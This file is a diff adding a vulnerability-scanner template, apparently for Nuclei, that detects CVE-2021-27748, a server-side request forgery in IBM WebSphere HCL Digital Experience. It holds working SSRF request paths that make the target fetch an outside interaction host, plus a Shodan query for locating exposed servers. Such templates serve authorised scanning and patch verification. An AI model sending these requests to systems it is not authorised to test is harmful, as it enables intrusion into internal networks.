@@ -1,0 +1,57 @@
+id: ibm-websphere-ssrf
+
+info:
+  name: IBM WebSphere HCL Digital Experience - Server-Side Request Forgery
+  author: pdteam
+  severity: high
+  description: |
+    IBM WebSphere HCL Digital Experience is vulnerable to server-side request forgery that impacts on-premise deployments and containers.
+  impact: |
+    Successful exploitation of this vulnerability could allow an attacker to bypass security controls, access internal resources, and potentially perform further attacks.
+  remediation: |
+    Apply the latest security patches or updates provided by IBM to mitigate this vulnerability.
+  reference:
+    - https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/
+    - https://support.hcltechsw.com/csm?id=kb_article&sysparm_article=KB0095665
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27748
+  classification:
+    cpe: cpe:2.3:a:ibm:websphere:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: http.html:"IBM WebSphere Portal"
+    product: websphere
+    vendor: ibm
+  tags: hcl,ibm,ssrf,websphere,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - "IBM WebSphere Portal"
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/docpicker/internal_proxy/http/oast.me'
+      - '{{BaseURL}}/wps/PA_WCM_Authoring_UI/proxy/http/oast.me'
+
+    host-redirects: true
+    max-redirects: 2
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Interactsh Server"
+# digest: 4a0a00473045022100992a83e979962635224910cce7dcfa55a19ff3018f275c06f0ddc88500b1ba5a02201daf0a88758145b9964f862e834814e9be2cfe78d13b34f42345f029e28943a7:922c64590222798bb761d5b6d8e72950
